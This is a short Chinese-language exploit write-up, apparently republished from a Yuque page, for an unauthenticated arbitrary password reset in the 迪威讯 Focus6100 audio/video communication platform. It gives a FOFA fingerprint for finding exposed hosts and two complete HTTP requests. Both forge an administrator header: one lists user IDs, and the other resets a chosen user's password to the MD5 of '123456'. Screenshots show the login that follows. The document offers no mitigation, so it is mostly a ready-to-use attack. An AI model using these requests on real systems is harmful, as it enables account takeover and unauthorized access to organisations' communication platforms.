# 迪威讯Focus6100音视频通讯平台存在任意用户密码修改漏洞

# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在任意用户密码修改漏洞

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征

![1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3.png](./img/MTvBdG6ERuHZMlFh/1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3-959691.png)

# 四 、漏洞复现
先获取ID

```java
GET /portal/rest/users HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```

![1727236976160-7d286d29-24f9-40e3-86d0-98105090b8a8.png](./img/MTvBdG6ERuHZMlFh/1727236976160-7d286d29-24f9-40e3-86d0-98105090b8a8-255472.png)

利用获取ID重置密码

```java
PUT /portal/rest/users/ff8080819200f6750192272f08bb0000/changepassword HTTP/1.1
Host: 
Content-Length: 32
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close

e10adc3949ba59abbe56e057f20f883e
```

![1727237017987-fc40aacc-8356-4d97-ac60-c5e007fd5fe0.png](./img/MTvBdG6ERuHZMlFh/1727237017987-fc40aacc-8356-4d97-ac60-c5e007fd5fe0-606119.png)

重置后登录：

![1727237031040-5d6fa479-b51f-42b9-ad53-f0924196b2e2.png](./img/MTvBdG6ERuHZMlFh/1727237031040-5d6fa479-b51f-42b9-ad53-f0924196b2e2-561445.png)



> 更新: 2024-10-22 09:36:09  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iucuo1rzm9ml0ugx>